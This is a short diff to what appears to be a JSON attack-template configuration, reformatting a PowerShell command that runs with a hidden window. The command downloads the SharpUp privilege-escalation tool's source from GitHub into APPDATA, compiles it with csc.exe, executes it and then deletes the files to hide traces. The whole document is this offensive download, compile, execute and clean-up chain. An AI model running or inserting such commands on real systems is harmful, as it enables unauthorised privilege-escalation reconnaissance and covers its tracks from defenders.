@@ -22,8 +22,11 @@
       "-nop",
       "-w 1",
       "\"",
-      "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/GhostPack/SharpUp/master/SharpUp/Program.cs', $env:APPDATA+'\\\\{{FileName.Value}}.cs');",
-      "c:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\{{.NetVersion.Value}}\\\\csc.exe /unsafe /out:$env:APPDATA\\\\{{FileName.Value}}.exe $env:APPDATA\\\\{{FileName.Value}}.cs;",
+      "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/GhostPack/SharpUp/master/SharpUp/Program.cs',",
+      "$env:APPDATA+'\\\\{{FileName.Value}}.cs');",
+      "c:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\{{.NetVersion.Value}}\\\\csc.exe /unsafe",
+      "/out:$env:APPDATA\\\\{{FileName.Value}}.exe",
+      "$env:APPDATA\\\\{{FileName.Value}}.cs;",
       "&$env:APPDATA\\\\{{FileName.Value}}.exe",
       ";del $env:APPDATA\\\\{{FileName.Value}}.*",
       "\""
